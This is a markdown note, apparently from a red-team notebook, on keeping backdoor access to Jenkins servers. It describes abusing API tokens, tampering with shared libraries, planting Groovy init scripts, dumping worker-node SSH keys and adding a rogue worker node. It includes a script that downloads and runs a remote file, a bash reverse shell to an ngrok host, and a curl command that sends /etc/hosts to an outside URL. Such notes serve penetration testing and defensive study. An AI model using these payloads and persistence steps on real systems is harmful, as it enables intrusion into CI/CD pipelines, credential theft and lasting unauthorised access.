# Backdooring

- Backdooring helps attacker to gain access over systems over long period of time ( sometimes bypassing the security checks )
- A higher level privileges might be required to do the changes in configuration



## User issued Jenkins API Tokens

- It is possible for users to generate their own API tokens.
- Can be used to bypass other authentication process ( Form based Authentication / 2FA authentication )
- Usually undected ( unless the usage count is not tracked )
- As an attacker we need to make sure, we need to give right priviliges to these compromised users in case Matrix Authorization Strategy is enabled.

```
curl http://username:token@127.0.0.1:8080
```
<img src="api-token-access.png">

## Using Shared Libraries

- Jenkins shared library is popular where large number of jenkins jobs or pipelines uses a repeated code in pipeline script. 
- The developers creates certain modular functions containing the repetitive code and then reuses across various projects/pipelines/jobs.
- Personal Research : https://oxhat.blogspot.com/2022/07/attacking-backdooring-and-exfiltrating.html
- There are 2 ways we can backdoor the shared pipelines
  1. Add a backdoor inside a shared library codebase ( Jenkins Admin Access Not Required )
``` Groovy
@Library("shared-libraries") _
pipeline{
    agent any
    stages {
        stage("example"){
            steps{
                sh "echo Just a job2"
                helloWorld(name:"User2",dayOfWeek:"Tuesday")
            }
        }
    }
}
```
  - <img src="shared-library-code.png">
  3. Change the shared library location to an attaker controlled shared library ( Jenkins Admin Access Required )
  - <img src="shared-library-conf.png">

## Groovy init scripts

- We can try this technique both from pipeline / after controller's compromise.
- We need to add ```init.groovy``` file with our payload at home directory ( the directory that contains other config files pf Jenkins, sometimes referred as $JENKINS_HOME )
- To trigger this, we would need a restart.
- We have couple of options what we can do with our backdoor scripts
  - Get a reverse shell - From my personal research I found my payloads / the ones from internet blocked the Jenkins from rebooting. This is because Jenkins is waiting for the init.groovy to complete before it can proceed. If you have a non blocking playload do let me know.
init.groovy
```
"wget -o revshell.sh  http://https://gist.githubusercontent.com/dibsy/temp-cmd.txt".execute()
"sh revshell.sh".execute()
```
revshell.sh
```
bash -i >& /dev/tcp/6.tcp.eu.ngrok.io/13520 0>&1
```
  - Exfiltrate data
exfil.groovy
```
"curl -X POST https://6aee-91-166-172-59.ngrok-free.app -d @/etc/hosts".execute()
```
  - Use other persistent techniques
    - Add a cronjob
    - Add another user

## Worker-Node SSH Keys

- We can dump the SSH keys from the Jenkins Controller
- Once we have the SSH keys we can montitor the logon events and exfiltrate the build data or snoop on it for debug logs or credentials.

## Addling Malicious Worker-Node 

- In this process we update / add a new configuration with an attacker controller worker node.
- We can update the Worker-Node configuration to point to that node.
- This is possible either adding a new agent or updating the ssh keys used for configuration.

<img src="configure-agent.png">

